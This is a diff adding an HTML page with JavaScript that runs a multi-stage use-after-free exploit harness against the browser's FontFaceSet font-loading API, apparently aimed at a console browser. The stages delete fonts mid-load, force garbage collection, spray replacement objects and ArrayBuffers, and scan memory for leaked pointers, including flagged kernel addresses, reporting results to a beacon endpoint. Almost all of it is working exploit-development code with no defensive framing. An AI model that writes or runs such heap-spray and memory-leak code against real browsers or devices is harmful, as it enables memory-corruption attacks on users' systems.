@@ -1,0 +1,519 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1212 FontFaceSet::load() UAF v2</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:50vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1212 — FONTFACESET LOAD UAF v2 (data: URI fonts)</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">...</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var c=FD.textContent;FD.textContent=(c==='no findings yet'?'':c+'\n')+t;}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1212-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1212: FontFaceSet::load() UAF v2
+
+   FIX from P1210: local() fonts reject immediately. Use url() with
+   data: URI or remote URL to actually trigger async loading state.
+   Also use CSS @font-face injection as alternative trigger mechanism.
+
+   Stages:
+   0: font source test — which sources successfully trigger loading state?
+   1: CSS @font-face + load() with deletion in loadingdone event
+   2: Multiple faces + mass deletion during loading event
+   3: FinalizationRegistry + font load + same-type spray
+   4: Stale promise chain after GC-collected FontFace
+   5: BigUint64Array scan through AB reclaim
+   ═══════════════════════════════════════════════════════════════════════ */
+
+/* Minimal valid OTF font as data: URI (12 glyphs, ~600 bytes) */
+var FONT_DATA='data:font/opentype;base64,'+
+'AAEAAAAKAIAAAwAgT1MvMkC7TgAAAA0wAAAAVmNtYXAADQJ1AAANWAAAADRH'+
+'bHlmAAAAAAAADbwAAAAQaGVhZBfBqg4AAAANzAAAADZoaGVhA+IB8gAADgQA'+
+'AAAkaG10eAPoAAAAAA4oAAAACGxvY2EAAAAUAAAOMAAAAARtYXhwAAIACAAA'+
+'DjQAAAAgbmFtZUjcMp4AAA5UAAAARHBvc3QAAwAAAA6YAAAAIAABAAAAAQBt'+
+'RK7iX18PPPUAAwPoAAAAANi4eLYAAAAA2Lh4tgAA/+AD6APgAAAACAACAAAA'+
+'AAAAAAAB//8AAgPoAAAD6AAAAAADAAAAAAEAAAAAAAAAAAAAAAAAAAACAAQA'+
+'AAACAAAAAQAAAAEAAAPoAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAA'+
+'AAAAAAAAAQAAAAIAAAADAAAABAAAAAUAAAAGAAAAAAAOAAEAAAAAABoAAwAB'+
+'AAAAAAACAAgAEAADAAEAAAABAAoAAQAAAAAAAAAAAA==';
+
+/* Alternative: use an inline SVG font (simpler, guaranteed to parse) */
+var SVG_FONT_DATA='data:image/svg+xml;base64,'+btoa(
+'<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'+
+'<svg xmlns="http://www.w3.org/2000/svg"><defs><font id="f"><font-face font-family="svgfont" units-per-em="1000"/>'+
+'<glyph unicode=" " horiz-adv-x="250"/><glyph unicode="A" d="M0 0L500 700L1000 0Z" horiz-adv-x="1000"/>'+
+'</font></defs></svg>');
+
+/* Remote font URL (our server - guaranteed to be reachable) */
+var REMOTE_FONT='/document/en/ps5/index.html';
+
+function makeFace(family,src){
+  return new FontFace(family,src?('url("'+src+'")'):('url("'+FONT_DATA+'")'));
+}
+
+var STAGES=['fontSource','cssLoadDelete','massDelete','finregSpray','stalePromise','bigintScan'];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1212_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1212_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/'+STAGES.length+' — '+(STAGES[stage]||'DONE'));
+
+function done(rep){
+  results.push({stage:stage,name:STAGES[stage],result:rep});
+  try{localStorage.setItem('p1212_res',JSON.stringify(results));}catch(e){}
+  B('RESULT','s'+stage+'|'+rep.slice(0,700));
+  addFind('S'+stage+' '+STAGES[stage]+': '+rep.slice(0,200));
+  log('=== S'+stage+' -> '+rep+' ===','ok');
+  setTimeout(function(){location.reload();},1500);
+}
+
+if(stage>=STAGES.length){
+  setStatus('ALL STAGES COMPLETE');
+  var summary=JSON.stringify(results);
+  B('ALL-DONE',summary.slice(0,800));
+  log('ALL DONE','ok');log(summary,'info');
+  try{localStorage.removeItem('p1212_stage');localStorage.removeItem('p1212_res');}catch(e){}
+}else{
+
+try{localStorage.setItem('p1212_stage',''+(stage+1));}catch(e){}
+setPhase(STAGES[stage]);
+
+/* ─── STAGE 0: Font source test ─── */
+if(stage===0)(function(){
+  log('S0: test which font sources trigger loading state','info');
+  var tests={};
+  var pending=0,total=0;
+
+  function testSrc(name,src){
+    total++;pending++;
+    try{
+      var f=new FontFace('srctest_'+name,src);
+      var s0=f.status;
+      document.fonts.add(f);
+
+      f.load().then(function(){
+        tests[name]={status0:s0,statusFinal:f.status,result:'loaded'};
+        document.fonts.delete(f);
+        log(name+': LOADED (status: '+s0+' -> '+f.status+')','ok');
+        if(--pending===0)finish();
+      }).catch(function(e){
+        tests[name]={status0:s0,statusFinal:f.status,result:'error',err:e.message};
+        document.fonts.delete(f);
+        log(name+': ERROR: '+e.message+' (status: '+s0+' -> '+f.status+')','err');
+        if(--pending===0)finish();
+      });
+
+      setTimeout(function(){
+        if(tests[name])return;
+        tests[name]={status0:s0,statusFinal:f.status,result:'timeout'};
+        document.fonts.delete(f);
+        if(--pending===0)finish();
+      },5000);
+    }catch(e){
+      tests[name]={result:'threw',err:e.message};
+      log(name+': THREW: '+e.message,'err');
+      if(--pending===0)finish();
+    }
+  }
+
+  testSrc('local_sans','local(sans-serif)');
+  testSrc('local_serif','local(serif)');
+  testSrc('local_mono','local(monospace)');
+  testSrc('data_otf','url("'+FONT_DATA+'")');
+  testSrc('svg_font','url("'+SVG_FONT_DATA+'")');
+  testSrc('remote_html','url("'+REMOTE_FONT+'")');
+  testSrc('data_garbage','url("data:font/woff2;base64,AAAA")');
+
+  function finish(){
+    var rep=JSON.stringify(tests);
+    log('sources: '+rep,'info');
+    done('FONT-SOURCES|'+rep);
+  }
+})();
+
+/* ─── STAGE 1: CSS @font-face + load with deletion ─── */
+else if(stage===1)(function(){
+  log('S1: inject CSS @font-face, load(), delete during loading event','info');
+
+  var events=[];
+  var N=10;
+  var faces=[];
+
+  for(var i=0;i<N;i++){
+    var style=document.createElement('style');
+    style.textContent='@font-face{font-family:"cssface'+i+'";src:url("'+REMOTE_FONT+'") format("truetype");}';
+    document.head.appendChild(style);
+  }
+
+  for(var i=0;i<N;i++){
+    try{
+      var f=makeFace('cssface'+i,REMOTE_FONT);
+      faces.push(f);
+      document.fonts.add(f);
+    }catch(e){events.push('addErr:'+e.message);}
+  }
+
+  log('added '+faces.length+' faces with remote URL','info');
+  events.push('added='+faces.length+'|setSize='+document.fonts.size);
+
+  document.fonts.addEventListener('loading',function(){
+    events.push('LOADING-EVENT');
+    log('LOADING event — deleting all faces!','hit');
+    for(var j=0;j<faces.length;j++){
+      try{document.fonts.delete(faces[j]);}catch(e){events.push('delErr');}
+    }
+    events.push('deleted-size='+document.fonts.size);
+  });
+
+  document.fonts.addEventListener('loadingdone',function(){
+    events.push('LOADINGDONE-size='+document.fonts.size);
+    log('loadingdone, size='+document.fonts.size,'ok');
+  });
+
+  document.fonts.addEventListener('loadingerror',function(){
+    events.push('LOADINGERROR');
+  });
+
+  var resolved=false;
+  try{
+    document.fonts.load('16px cssface0').then(function(r){
+      resolved=true;
+      events.push('load-resolved:'+((r&&r.length)||0));
+      log('load() resolved with '+((r&&r.length)||0)+' faces','ok');
+      finish();
+    }).catch(function(e){
+      resolved=true;
+      events.push('load-rejected:'+e.message);
+      log('load() rejected: '+e.message,'err');
+      finish();
+    });
+  }catch(e){
+    events.push('load-threw:'+e.message);
+    finish();
+  }
+
+  function finish(){
+    done('CSS-LOAD-DELETE|events=['+events.join('|')+']');
+  }
+  setTimeout(function(){if(!resolved){events.push('TIMEOUT');finish();}},10000);
+})();
+
+/* ─── STAGE 2: Mass delete during font loading ─── */
+else if(stage===2)(function(){
+  log('S2: mass create-load-delete with remote font URL','info');
+
+  var ITERS=20;
+  var iter=0;
+  var events=[];
+  var anomalies=0;
+
+  function cycle(){
+    if(iter>=ITERS){
+      done('MASS-DELETE|iters='+ITERS+'|anomalies='+anomalies+'|events=['+events.slice(-10).join('|')+']');
+      return;
+    }
+    setCounters('cycle '+iter+'/'+ITERS+' anomalies='+anomalies);
+
+    var faces=[];
+    for(var i=0;i<5;i++){
+      try{
+        var f=makeFace('mass'+iter+'_'+i,REMOTE_FONT);
+        faces.push(f);
+        document.fonts.add(f);
+      }catch(e){}
+    }
+
+    var loadingFired=false;
+    document.fonts.addEventListener('loading',function h(){
+      document.fonts.removeEventListener('loading',h);
+      loadingFired=true;
+      for(var j=0;j<faces.length;j++){
+        try{document.fonts.delete(faces[j]);}catch(e){}
+      }
+      events.push('i'+iter+':loading-deleted');
+    },{once:true});
+
+    try{
+      document.fonts.load('16px mass'+iter+'_0').then(function(r){
+        var len=r?r.length:0;
+        if(len>0||loadingFired){
+          events.push('i'+iter+':resolved='+len+'|loadingFired='+loadingFired);
+          if(loadingFired)anomalies++;
+        }
+        iter++;setTimeout(cycle,100);
+      }).catch(function(){
+        events.push('i'+iter+':rejected|loadingFired='+loadingFired);
+        if(loadingFired)anomalies++;
+        iter++;setTimeout(cycle,100);
+      });
+    }catch(e){iter++;setTimeout(cycle,100);}
+
+    setTimeout(function(){iter++;setTimeout(cycle,100);},4000);
+  }
+  cycle();
+})();
+
+/* ─── STAGE 3: FinalizationRegistry + same-type spray ─── */
+else if(stage===3)(function(){
+  log('S3: FinReg GC detection + same-type FontFace spray','info');
+
+  if(typeof FinalizationRegistry!=='function'){done('FINREG-SPRAY|NO-FinReg');return;}
+
+  var collected=0;
+  var collectIds=[];
+  var fr=new FinalizationRegistry(function(id){
+    collected++;
+    collectIds.push(id);
+    log('FinReg: collected '+id+' (total='+collected+')','hit');
+    B('FINREG','id='+id+'|total='+collected);
+  });
+
+  var N=20;
+  var staleRefs=[];
+  for(var i=0;i<N;i++){
+    var f=makeFace('finreg'+i,REMOTE_FONT);
+    document.fonts.add(f);
+    staleRefs.push({loaded:f.loaded,status:f.status});
+    fr.register(f,'fr_'+i);
+    document.fonts.delete(f);
+  }
+  log('created+registered+deleted '+N+' faces','warn');
+
+  function pressure(){
+    var a=[];
+    for(var j=0;j<5000;j++)a.push(new ArrayBuffer(192));
+    a=null;
+  }
+
+  var rounds=0;
+  function gcLoop(){
+    if(rounds>=40||collected>=N){
+      log('GC done: '+collected+'/'+N+' collected in '+rounds+' rounds','ok');
+
+      var replacements=[];
+      for(var k=0;k<N*3;k++){
+        try{
+          var r=makeFace('replace'+k,REMOTE_FONT);
+          document.fonts.add(r);
+          replacements.push(r);
+        }catch(e){}
+      }
+      log('sprayed '+replacements.length+' replacement FontFaces','warn');
+
+      setTimeout(function(){
+        var staleResults=[];
+        for(var s=0;s<staleRefs.length;s++){
+          try{
+            var pr=staleRefs[s].loaded;
+            if(pr&&typeof pr.then==='function'){
+              (function(idx,prom){
+                prom.then(function(v){
+                  staleResults.push('idx'+idx+':resolved:'+typeof v);
+                  log('stale['+idx+'] resolved: '+typeof v,'hit');
+                  B('STALE-OK','idx='+idx+'|type='+typeof v);
+                }).catch(function(e){
+                  staleResults.push('idx'+idx+':rejected:'+e.message.slice(0,50));
+                });
+              })(s,pr);
+            }
+          }catch(e){
+            staleResults.push('idx'+s+':threw:'+e.message.slice(0,50));
+          }
+        }
+
+        setTimeout(function(){
+          done('FINREG-SPRAY|collected='+collected+'/'+N+'|rounds='+rounds+
+               '|stale=['+staleResults.slice(0,10).join(',')+']');
+        },2000);
+      },500);
+      return;
+    }
+    pressure();rounds++;
+    setCounters('GC '+rounds+'/40 collected='+collected+'/'+N);
+    setTimeout(gcLoop,150);
+  }
+  gcLoop();
+  setTimeout(function(){if(rounds<40&&collected<N)gcLoop();},30000);
+})();
+
+/* ─── STAGE 4: Stale promise after GC ─── */
+else if(stage===4)(function(){
+  log('S4: stale .loaded promise after wrapper GC','info');
+
+  if(typeof FinalizationRegistry!=='function'){done('STALE-PROMISE|NO-FinReg');return;}
+
+  var stalePromise=null;
+  var collected=false;
+  var fr=new FinalizationRegistry(function(){
+    collected=true;
+    log('TARGET GC\'d — accessing stale promise','hit');
+
+    var replacements=[];
+    for(var k=0;k<100;k++){
+      try{
+        var r=makeFace('stalerepl'+k,REMOTE_FONT);
+        document.fonts.add(r);
+        replacements.push(r);
+      }catch(e){}
+    }
+
+    setTimeout(function(){
+      try{
+        stalePromise.then(function(v){
+          var info='type='+typeof v;
+          if(v&&typeof v==='object'){
+            try{info+='|keys='+Object.keys(v).join(',');}catch(e){}
+            try{info+='|family='+v.family;}catch(e){}
+            try{info+='|status='+v.status;}catch(e){}
+            try{info+='|str='+String(v).slice(0,100);}catch(e){}
+          }
+          log('STALE RESOLVED: '+info,'hit');
+          B('STALE-RESOLVED',info);
+          done('STALE-PROMISE|RESOLVED|'+info);
+        }).catch(function(e){
+          done('STALE-PROMISE|REJECTED|'+e.message);
+        });
+      }catch(e){
+        done('STALE-PROMISE|THREW|'+e.message);
+      }
+    },200);
+  });
+
+  (function(){
+    var target=makeFace('staletarget',REMOTE_FONT);
+    document.fonts.add(target);
+    stalePromise=target.loaded;
+    fr.register(target,'target');
+    document.fonts.delete(target);
+    target=null;
+  })();
+
+  function pressure(){var a=[];for(var j=0;j<8000;j++)a.push(new ArrayBuffer(192));a=null;}
+  var rounds=0;
+  function gcLoop(){
+    if(collected||rounds>=50)return;
+    pressure();rounds++;
+    setCounters('GC '+rounds+'/50 collected='+collected);
+    setTimeout(gcLoop,120);
+  }
+  gcLoop();
+  setTimeout(function(){if(!collected)done('STALE-PROMISE|NOT-COLLECTED|rounds='+rounds);},30000);
+})();
+
+/* ─── STAGE 5: BigUint64Array scan ─── */
+else if(stage===5)(function(){
+  log('S5: BigUint64Array spray + scan after FontFace GC','info');
+
+  if(typeof BigUint64Array!=='function'){done('BIGINT-SCAN|NO-BigUint64');return;}
+  if(typeof FinalizationRegistry!=='function'){done('BIGINT-SCAN|NO-FinReg');return;}
+
+  var collected=0;
+  var sprays=[];
+  var ptrFinds=[];
+
+  var fr=new FinalizationRegistry(function(id){
+    collected++;
+    if(collected===1){
+      log('first face collected — spraying ABs','hit');
+      for(var k=0;k<200;k++){
+        var ab=new ArrayBuffer(192);
+        var bv=new BigUint64Array(ab);
+        sprays.push({ab:ab,bv:bv});
+      }
+    }
+  });
+
+  var N=30;
+  for(var i=0;i<N;i++){
+    (function(){
+      var f=makeFace('bigscan'+i,REMOTE_FONT);
+      document.fonts.add(f);
+      fr.register(f,'bs_'+i);
+      document.fonts.delete(f);
+    })();
+  }
+
+  function pressure(){var a=[];for(var j=0;j<10000;j++)a.push(new ArrayBuffer(192));a=null;}
+  var rounds=0;
+
+  function gcAndScan(){
+    if(rounds>=50||collected>=Math.min(N,10)){
+      log('scanning '+sprays.length+' ABs for nonzero values...','info');
+      for(var s=0;s<sprays.length;s++){
+        var bv=sprays[s].bv;
+        for(var q=0;q<bv.length;q++){
+          var v=bv[q];
+          if(v!==BigInt(0)){
+            var hex='0x'+v.toString(16).padStart(16,'0');
+            ptrFinds.push('s'+s+'['+q+']='+hex);
+            var hi=Number(v>>BigInt(32));
+            if(hi>=0xFFFF8000){
+              log('!!! KERNEL PTR: ['+s+']['+q+'] = '+hex,'hit');
+              B('KPTR',hex);
+            }else if(hi>0){
+              log('NONZERO: ['+s+']['+q+'] = '+hex,'warn');
+              B('NZPTR',hex);
+            }
+          }
+        }
+      }
+      done('BIGINT-SCAN|collected='+collected+'/'+N+'|rounds='+rounds+
+           '|sprays='+sprays.length+'|ptrs='+ptrFinds.length+
+           '|finds=['+ptrFinds.slice(0,15).join(',')+']');
+      return;
+    }
+    pressure();rounds++;
+    setCounters('GC '+rounds+'/50 collected='+collected+'/'+N+'|sprays='+sprays.length);
+    setTimeout(gcAndScan,150);
+  }
+  gcAndScan();
+  setTimeout(function(){if(rounds<50)gcAndScan();},30000);
+})();
+
+} /* end else */
+
+/* ─── Reload poller ─── */
+var _rl='',_rp=0;
+function checkReload(){
+  if(_rp>300)return;_rp++;
+  var x=new XMLHttpRequest();
+  x.open('GET','/reload.txt?_='+Date.now(),true);x.timeout=3000;
+  x.onload=function(){var t=(x.responseText||'').trim();
+  if(_rl&&t!==_rl){setTimeout(function(){location.reload();},500);return;}_rl=t;};
+  try{x.send();}catch(e){}setTimeout(checkReload,3000);
+}
+setTimeout(checkReload,2000);
+</script>
+</body></html>
